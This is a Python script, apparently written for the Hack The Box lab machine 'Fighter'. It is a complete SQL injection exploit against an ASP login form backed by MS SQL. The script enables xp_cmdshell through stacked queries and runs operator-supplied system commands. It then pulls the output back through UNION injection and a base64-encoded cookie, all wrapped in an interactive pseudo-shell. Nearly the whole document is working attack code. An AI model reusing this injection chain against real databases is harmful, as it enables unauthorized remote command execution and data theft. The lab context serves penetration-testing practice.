#SQL Injection Pseudo-Shell for HTB's Fighter
#MS SQL 2014

import requests
from base64 import b64decode
from urllib.parse import unquote

class Fighter():
    def __init__(self,input):
        self.input = input
        self.logo()
        self.Setup()

    def logo(self):
        display = "░██████╗░██████╗░██╗░░░░░\n"
        display += "██╔════╝██╔═══██╗██║░░░░░\n"
        display += "╚█████╗░██║██╗██║██║░░░░░\n"
        display += "░╚═══██╗╚██████╔╝██║░░░░░\n"
        display += "██████╔╝░╚═██╔═╝░███████╗\n"
        display += "╚═════╝░░░░╚═╝░░░╚══════╝\n"
        print(display)

    def Setup(self):

        TurnOnXPShell = "1;EXEC sp_configure 'show advanced options', 1; exec sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -"
            
        Create_New_Table = "3;CREATE TABLE test (ID int IDENTITY(1,1) PRIMARY KEY, output varchar(1024))" 

        self.makeRequest(TurnOnXPShell) 

        self.makeRequest(Create_New_Table)
    
        self.runCMD()

    def makeRequest(self,sql_command):
        target_url = "http://members.streetfighterclub.htb/old/verify.asp"

        sql_command_data = {'username':'admin',
            'password':'admin',
            'logintype':sql_command,
            'rememberme':'ON',
            'B1':'LogIn'
            }

        return requests.post(target_url, allow_redirects=False, data=sql_command_data)

    def runCMD(self):
        truncatingTable = "1;TRUNCATE TABLE test;" 
        self.makeRequest(truncatingTable)
        
        Input = self.input.replace("'","''") 
        self.makeRequest(f"1;insert into test (output) exec Xp_CmDShelL '{Input}';-- -")
        self.getOutput()

    def getOutput(self):
        get_each_column_line = "1 union select 1,2,3,4,(select top 1 ID from test order by ID desc),6-- -"
        column_line_request = self.makeRequest(get_each_column_line)
        count = int(self.decodeCookies(column_line_request.cookies)) 

        for each_column_row in range(1,count):
            line = self.makeRequest(f'1 union select 1,2,3,4,(select output from test where ID = {each_column_row}),6-- -')
            try:
                output = self.decodeCookies(line.cookies)
                print(output.decode())
            except:
                None

    def decodeCookies(self,cookies): 
        return b64decode(unquote(cookies['Email']))

if __name__ == "__main__":
    while True:
        try:
            Input = input("SQL RCE: ")
            Fighter(Input)
        except KeyboardInterrupt:
            print("Bye Bye!")
            exit()

